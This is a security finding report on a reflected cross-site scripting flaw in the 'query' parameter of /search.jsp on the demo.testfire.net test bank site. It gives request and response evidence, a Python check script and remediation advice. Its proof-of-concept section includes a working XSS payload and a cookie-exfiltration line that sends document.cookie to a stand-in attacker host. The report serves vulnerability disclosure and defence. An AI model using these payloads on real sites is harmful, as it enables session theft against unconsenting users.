# Reflected XSS in GET /search.jsp 'query' parameter

**ID:** vuln-0006
**Severity:** MEDIUM
**Found:** 2026-09-20 21:48:00 UTC
**Target:** http://demo.testfire.net
**Endpoint:** /search.jsp
**Method:** GET
**CWE:** CWE-79
**CVSS:** 6.1
**Confidence:** High
**Fix Effort:** Low

## Description

The `query` parameter of `/search.jsp` is reflected into the HTML response body without any output encoding. An unauthenticated attacker can supply a crafted link that executes arbitrary JavaScript in the victim's browser in the context of the application origin.

## Evidence

Request:
```http
GET /search.jsp?query=%3Cscript%3Edocument.title%3D%22PWNED_SRCH%22%3C%2Fscript%3E HTTP/1.1
Host: demo.testfire.net
```
Response excerpt (payload reflected raw, unencoded):
```html
<p>No results were found for the query:<br /><br />
<script>document.title="PWNED_SRCH"</script>
```
Browser confirmation: after loading the crafted URL the page title became `PWNED_SRCH`, confirming the script executed in the application origin. Response headers contained no CSP and no X-XSS-Protection.

Additional encoding probe — `query="'><&test` returned verbatim:
```html
<p>No results were found for the query:<br /><br />
"'><&test
```

## Impact

An attacker who lures an authenticated or unauthenticated victim to a crafted URL can run arbitrary JavaScript in the app origin. This enables theft of non-HttpOnly data (e.g. the `AltoroAccounts` cookie), performing authenticated actions as the victim (transfer funds, view accounts, change details) and phishing/credential capture inside the trusted origin. No authentication is required to deliver the payload.

## Counterevidence

Considered a server-side filter or WAF: none is present for this parameter (the raw payload is echoed unchanged, and the deployment has no WAF). Considered browser XSS filtering: modern Chromium/Firefox do not block reflected XSS by default and the payload executed in a real browser session. Considered whether the reflected value is inert text: it is written into element content (not an attribute) and the `<script>` executed, proven by the changed `document.title`. No CSP is returned to block inline script.

## What Would Change This Severity

Evidence that the response is served with a strict CSP (e.g. nonce/hash-based `script-src`) that blocks inline script would lower severity; conversely a demonstrated cross-user/admin session compromise would raise it.

## Technical Analysis

`/search.jsp` writes the user-supplied `query` value directly into the results HTML inside a `<p>` element with no HTML encoding and no output sanitisation. The response carries no `Content-Security-Policy` and no `X-XSS-Protection` header, and the `Content-Type` is `text/html;charset=ISO-8859-1`, so injected markup is parsed and executed as HTML/script. Special characters `<`, `>`, `"`, `'` and `&` are all returned verbatim.

Reflection context (verbatim from response):
```html
<p>No results were found for the query:<br /><br />
<script>document.title="PWNED_SRCH"</script>
```

The parameter is reachable unauthenticated over both HTTP and HTTPS.

## Proof of Concept

1. Craft the URL `http://demo.testfire.net/search.jsp?query=<script>document.title="PWNED_SRCH"</script>` (URL-encode the payload).
2. Load the URL in a browser.
3. Observe that the `<script>` is reflected unencoded into the page body and executes; `document.title` becomes `PWNED_SRCH`.
4. Alternative high-impact payloads such as `<script>fetch('//attacker/'+document.cookie)</script>` execute in the same context.

```python
import requests, urllib.parse

base = "http://demo.testfire.net/search.jsp?query="
payload = '<script>document.title="PWNED_SRCH"</script>'
url = base + urllib.parse.quote(payload, safe='')

r = requests.get(url, timeout=15)
print("status:", r.status_code)
# The payload is reflected unencoded -> executes in the browser
idx = r.text.find('<script>document.title="PWNED_SRCH"')
print("reflected:", idx != -1)
print(r.text[idx-60:idx+80])
```

## Remediation

Apply context-aware output encoding to the `query` value before writing it into the HTML response (HTML-entity encode `&`, `<`, `>`, `"`, `'`). Prefer the templating layer's automatic escaping instead of string concatenation. Add a restrictive `Content-Security-Policy` (e.g. `default-src 'self'; script-src 'self'`) as defence in depth, and consider a server-side input validation layer. Ensure the same escaping is applied on every code path that renders user input.

## Assumptions

Assumes the victim visits the crafted link while authenticated (or unauthenticated) in the bank. No attacker credentials are required to deliver the payload. Delivery is via a standard reflected-XSS lure.
